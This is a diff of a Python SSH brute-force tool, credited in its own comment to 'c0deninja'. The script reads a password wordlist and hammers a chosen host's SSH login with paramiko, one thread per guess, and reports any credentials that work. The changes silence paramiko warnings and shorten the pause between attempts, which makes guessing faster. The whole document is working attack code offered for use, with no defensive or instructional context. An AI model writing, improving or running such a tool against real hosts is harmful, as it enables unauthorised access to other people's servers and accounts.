@@ -1,19 +1,22 @@
 #!/usr/bin/python3
 
 import paramiko, time, threading, socket, sys
+import warnings                                               
+                                                              
+# termporary fix for paramiko crypto warnings                 
+warnings.filterwarnings(action='ignore',module='.*paramiko.*')
 
-# SSHbrute script by c0deninja
-
+# ssh brute forcer script by c0deninja
 
 wordlist = input("Enter wordlist: ")
 host = input("Enter Host: ")
 user = input("Enter User: ")
 
 def sshbanner():
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((host, 22))
-	data = s.recv(1024)
-	print (data.strip())
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, 22))
+    data = s.recv(1024)
+    print (data.strip())
 
 sshbanner()
 
@@ -33,11 +36,11 @@ def ssh_connect(host, user, passwords):
 	else:
 		print ("Found: %s:%s" % (user,passwords))
 	ssh.close()
-
 	return
+	
 for password in passlist:
 	passwords = password.strip()
 	t = threading.Thread(target=ssh_connect, args=(host, user, passwords))
 	t.start()
-	time.sleep(0.4)
+	time.sleep(0.3)
 file.close()
